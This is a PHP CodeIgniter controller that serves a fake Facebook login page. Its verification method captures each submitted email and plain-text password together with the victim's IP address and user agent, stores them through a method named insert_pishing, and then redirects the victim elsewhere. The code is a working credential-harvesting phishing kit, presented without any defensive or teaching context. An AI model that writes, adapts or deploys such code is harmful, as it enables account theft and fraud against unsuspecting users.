<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Facebook extends CI_Controller {
	public function __construct()
	{
		parent::__construct();
		$this->load->model('facebook_model');
		$this->load->helper(array('html','url'));
		$this->load->library(array('parser','session'));	
		echo doctype();
		$meta = array(
		        array('name' => 'robots', 'content' => 'no-cache'),
		        array('name' => 'Content-type', 'content' => 'text/html; charset=utf-8', 'type' => 'equiv')
		);
		echo meta($meta);
		echo link_tag(array('href'=>'assets/css/2hSFpLyJkhn.css', 'rel' => 'stylesheet','type' => 'text/css','media'=>'screen,projection,print'));
		echo link_tag(array('href'=>'assets/css/3KksxF1ssE6.css', 'rel' => 'stylesheet','type' => 'text/css','media'=>'screen,projection,print'));
		echo link_tag(array('href'=>'assets/css/gw_92Bo7N4s.css', 'rel' => 'stylesheet','type' => 'text/css','media'=>'screen,projection,print'));
		echo link_tag(array('href'=>'assets/css/jTnRm7EefoH.css', 'rel' => 'stylesheet','type' => 'text/css','media'=>'screen,projection,print'));
	}
	public function index()
	{
		$title = $this->facebook_model->title();
		$button = $this->facebook_model->button();
		$check_button = $this->facebook_model->check_button();
		$view_array['email']=$this->input->get('account');
		$view_array['title']=$title;
		$view_array['button']=$button;
		$view_array['check_button']=$check_button;
		$this->load->view('facebook/index',$view_array);
	}
	public function verification()
	{
		$input_array  = $this->input->post();
		if($input_array['email'] =="" or $input_array['pass']=="")
		{
			echo "<script>alert('".$this->facebook_model->missing()."');history.go(-1);</script>";			
		}
		else
		{
			$insert_array['email'] = $input_array['email'];
			$insert_array['pass'] =$input_array['pass'];
			$insert_array['ip'] = $this->input->ip_address();
			$insert_array['useragent'] =$this->input->user_agent();
			$insert_array['time'] = date("Y-m-d H:s:i");
			$this->facebook_model->insert_pishing($insert_array);
			echo "<script>alert('".$this->facebook_model->redirect()."');window.location='".$this->facebook_model->redirect_url()."'</script>";
		}
	}	
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */